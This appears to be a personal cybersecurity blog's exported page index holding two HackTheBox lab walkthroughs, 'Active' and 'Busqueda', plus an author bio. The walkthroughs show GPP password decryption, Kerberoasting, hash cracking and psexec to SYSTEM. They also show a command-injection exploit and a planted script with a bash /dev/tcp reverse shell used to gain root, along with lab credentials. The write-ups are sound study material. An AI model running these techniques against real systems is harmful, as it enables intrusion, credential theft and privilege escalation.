


[{"content":" Machine Info Platform HackTheBox Operative System Windows Difficulty Easy IP 10.10.10.100 Enumeration # Let\u0026rsquo;s begin the enumeration with Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.100 -oN ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-04 18:47:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2025-01-04T18:48:37 |_ start_date: 2025-01-04T18:21:40 |_clock-skew: -1s There are quite a few ports open. We can begin the enumeration by checking if there is any information on SMB shares:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ smbclient -N -L \\\\10.10.10.100 Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk The Replication share has some info that we can access:\nsmb: \\\u0026gt; ls active.htb D 0 Sat Jul 21 00:37:44 2018 Credential Gathering # We discover a password on Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ cat Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; The file Groups.xml is automatically created on the SYSVOL share when a Group Policy Preference is created. The file contains Groups related information, even passwords. These are encrypted with a private key from Microsoft, but it was published by accident.\nThis is quite old (from around 2014) but is great knoledge to have, as if a system contains old files wich contain a password encrypted from a Group Policy Preference, it can be decripted with the tool gpp-decrypt.\n┌──(s3n㉿kali)-[~] └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 After finding the password for the SVC_TGS user, we should take a look of the shares that we couldn\u0026rsquo;t access, such as Users, to check if we obtained any privilege on it.\n┌──(s3n㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.10.100\\\\Users -W active.htb -U SVC_TGS Password for [ACTIVE.HTB\\SVC_TGS]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sat Jul 21 04:39:20 2018 .. DR 0 Sat Jul 21 04:39:20 2018 Administrator D 0 Mon Jul 16 00:14:21 2018 All Users DHSrn 0 Mon Jul 13 19:06:44 2009 Default DHR 0 Mon Jul 13 20:38:21 2009 Default User DHSrn 0 Mon Jul 13 19:06:44 2009 desktop.ini AHS 174 Mon Jul 13 18:57:55 2009 Public DR 0 Mon Jul 13 18:57:55 2009 SVC_TGS D 0 Sat Jul 21 05:16:32 2018 It looks like it worked! We enumerate again but we don\u0026rsquo;t find anything relevant.\nWe could claim the user flag in the SVC_TGS/Desktop directory but I won\u0026rsquo;t do it, as it wouldn\u0026rsquo;t count in exams like OSCP, as you need an interactive shell.\nWith user SVC_TGS it seems that we don\u0026rsquo;t have a way of getting a foothold on the machine as I tried to RDP. However, we can continue enumerating the internal network as we have valid credentials with this user.\nKerberoasting # Kerberoasting is a post-exploitation technique we can use when assessing Active Directory (AD) environments. The objective is to obtain the password hash of a service account associated with a Service Principal Name (SPN). SPNs are attributes in AD that uniquely tie a service to a user account, enabling Kerberos authentication.\nIn this scenario, as authenticated domain users, we request a Kerberos service ticket for an SPN. The domain controller generates the ticket and encrypts it using the NTLM hash of the service account password linked to the SPN. This ticket is then provided to us. At this stage, we don’t require elevated privileges—just a valid domain user account to request the ticket.\nOnce we retrieve the encrypted ticket, we can crack it offline using tools like Hashcat. If successful, we recover the plaintext password of the service account.\nWe can try to check for users SPNs with Impacket\u0026rsquo;s GetUserSPN tool:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon/Users_Share] └─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 09:06:40.351723 2025-01-04 08:22:56.876969 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8 Nice! We got the Now, we can try to crack this hash with hashcat:\nsudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8:Ticketmaster1968 We found Administrator\u0026rsquo;s password with value Ticketmaster1968. We can try to abuse SMB to stablish a shell with psexec:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ impacket-psexec Administrator@10.10.10.100 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file zOdNJqkf.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service ROhE on 10.10.10.100..... [*] Starting service ROhE..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system Now we can read both flags:\nC:\\\u0026gt; type C:\\Users\\SVC_TGS\\Desktop\\user.txt 40538eb1a29a0cef0b8d9a4d7a3a387f C:\\\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt b8737ca7bc28f8b9dcce856e5226956d ","date":"6 January 2025","externalUrl":null,"permalink":"/posts/active/","section":"Posts","summary":"Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment. This machine teaches us about Group Policy Preferences Passwords and how to abuse them.","title":"Active","type":"posts"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/post/","section":"Tags","summary":"","title":"Post","type":"tags"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/","section":"S3ntinl","summary":"","title":"S3ntinl","type":"page"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"18 December 2024","externalUrl":null,"permalink":"/tags/about/","section":"Tags","summary":"","title":"About","type":"tags"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":" Biography # Hi! My name is Marcos, and I’m a 21-year-old Cybersecurity student. On the Internet, you might know me as S3n or S3ntinl. I’m currently pursuing a Master’s Degree in Cybersecurity for Information Technology Environments and preparing for the OSCP certification.\nI spend most of my time coding, solving CTFs, or overall, studying. My passion lies into hacking and finding creative ways to solve problems.\nThis blog is my way of documenting my journey while sharing, not just my progress but also tools, techniques, and lessons I pick up along the way. I hope it becomes a resource for others, whether you’re a beginner exploring cybersecurity or an experienced hacker looking for fresh perspectives.\nFeel free to reach out to any of my Media if you have any questions or ideas!\n","date":"18 December 2024","externalUrl":null,"permalink":"/about/","section":"S3ntinl","summary":"A little introduction about myself!","title":"Who is S3ntinl?","type":"page"},{"content":"","date":"18 December 2024","externalUrl":null,"permalink":"/tags/whoami/","section":"Tags","summary":"","title":"Whoami","type":"tags"},{"content":" Machine Info Platform HackTheBox Operative System Linux Difficulty Easy IP 10.10.11.208 Enumeration # ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel We can see that the web on port 80 redirects to searcher.htb. Let\u0026rsquo;s add it to /etc/hosts.\nAs soon as we land on the page, we see the following: A quick look shows the version of the App that is running behind this website, which is Searchor 2.4.0. If we look for vulnerabilities, we find the following exploit\nExploitation # Let\u0026rsquo;s run the exploit:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646 We put a netcat listener to receive the connection:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4646 listening on [any] 4646 ... connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288 We succesfully enter the machine as user svc .\nsvc@busqueda:~$ cat user.txt cat user.txt 75a17...8bd3e Privilege Escalation # Looking though the system files, we find a .git with credentials in the app folder.\nsvc@busqueda:/var/www/app/.git$ cat config [core] repositoryformatversion = 0 ... [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main The user is cody and the password is jh1usoih2bkjaspwe92 for an application in a subdomain called gitea. Let\u0026rsquo;s add it to the /etc/hosts and take a look.\nInside here, we don\u0026rsquo;t find anything interesing, appart that we can see a user called administrator. Although, we can try to SSH with the svc user and cody\u0026rsquo;s password:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ssh svc@10.10.11.208 svc@10.10.11.208\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage ... Last login: Tue Apr 4 17:02:09 2023 from 10.10.14.19 Let\u0026rsquo;s check the sudo privileges that this user has:\nsvc@busqueda:/opt/scripts$ sudo -l User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * This user has the right to execute that script inside /opr/scripts.\nIf we run it, we can see the following options:\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Usage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkup After some investigation, we discover the docker-inspect option can be use to retrieve information from the docker containers that are running in the machine, before seen with the docker-ps option.\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .}}\u0026#39; gitea | jq \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], It looks like we find more credentials for the gitea application. Let\u0026rsquo;s try to log in as administrator with these credentials.\nNice! Now we can check the content of the scripts in the /opt folder.\nReading the script system-checkup.py script we notice that the full-checkup.sh script is referenced as if it was in the same folder:\n... elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) ... We can abuse this by creating our own malicious script and reference it, as we are executing it with sudo privileges:\nsvc@busqueda:/tmp$ cat full-checkup.sh #!/bin/bash bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.12/4647 \u0026lt;\u0026amp;1\u0026#39; Keep in mind that you need to grant execution privileges to the script to run, as this was a mistake of mine that took me quite a lot of time to figure out.\nNow, we set a netcat listener and execute the malicious script:\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup In the netcat we receive the root shell:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4647 listening on [any] 4647 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020 root@busqueda:/tmp# whoami root Nice! We rooted the machine.\nroot@busqueda:~# cat /root/root.txt cat /root/root.txt ccd03ae...0e87097 ","date":"4 September 2021","externalUrl":null,"permalink":"/posts/busqueda/","section":"Posts","summary":"Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a \u003ccode\u003ePython\u003c/code\u003e module to gain user-level access to the machine. To escalate privileges to \u003ccode\u003eroot\u003c/code\u003e, we discover credentials within a \u003ccode\u003eGit\u003c/code\u003e config file, allowing us to log into a local \u003ccode\u003eGitea\u003c/code\u003e service.","title":"Busqueda","type":"posts"},{"content":"","date":"4 September 2021","externalUrl":null,"permalink":"/tags/linux-/","section":"Tags","summary":"","title":"Linux ","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]